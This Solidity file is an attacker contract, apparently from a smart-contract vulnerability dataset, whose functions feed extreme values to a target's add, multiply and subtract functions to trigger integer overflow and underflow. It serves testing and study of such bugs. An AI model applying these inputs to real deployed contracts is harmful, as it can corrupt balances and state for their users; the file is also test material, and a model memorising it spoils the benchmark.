pragma solidity ^0.8.0;

import "../dataset/arithmetic/overflow_single_tx.sol";

contract IntegerOverflowSingleTransactionAttacker {
    IntegerOverflowSingleTransaction public target;

    constructor (address _targetAddress) {
        target = IntegerOverflowSingleTransaction(_targetAddress);
    }

    function attackOverflowAddToState() public {
        uint256 largeNumber = 2**256 - 1;
        target.overflowaddtostate(largeNumber);
    }

    function attackOverflowMulToState() public {
        uint256 largeNumber = 2**255;
        target.overflowmultostate(largeNumber);
        target.overflowmultostate(2);
    }

    function attackUnderflowToState() public {
        uint256 number = 2;
        target.underflowtostate(number);
    }

    function attackOverflowAddLocalOnly() public {
        uint256 largeNumber = 2**256 - 1;
        target.overflowlocalonly(largeNumber);
    }

    function attackOverflowMulLocalOnly() public {
        uint256 largeNumber = 2**255;
        target.overflowmulocalonly(largeNumber);
        target.overflowmulocalonly(2);
    }

    function attackUnderflowLocalOnly() public {
        uint256 number = 2;
        target.underflowlocalonly(number);
    }
}